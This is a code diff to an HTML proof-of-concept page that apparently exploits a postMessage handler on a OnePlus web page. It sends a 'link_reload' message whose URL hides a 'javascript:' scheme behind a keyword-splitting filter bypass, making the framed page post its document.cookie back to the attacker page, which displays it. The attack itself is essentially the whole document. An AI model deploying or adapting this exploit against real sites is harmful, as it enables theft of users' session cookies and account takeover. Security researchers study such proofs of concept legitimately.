@@ -10,7 +10,10 @@ window.addEventListener('message', function(e) {
         console.log('Get data from oneplus ---> ' + e.data);
 	document.getElementById('cookie').innerHTML = e.data;
     }, false);
-    
-document.getElementById('sendmessage').contentWindow.postMessage('{"type":"link_reload","url":"javasscjavascriptriptcript:window.parent.postMessage(document.cookie,\"*\")"}',"*")
+
+function getCookie(){
+	document.getElementById('sendmessage').contentWindow.postMessage('{"type":"link_reload","url":"javasscjavascriptriptcript:window.parent.postMessage(document.cookie,\"*\")"}',"*");
+}
+setTimeout(getCookie(), 5000);
 </script>
 </html>
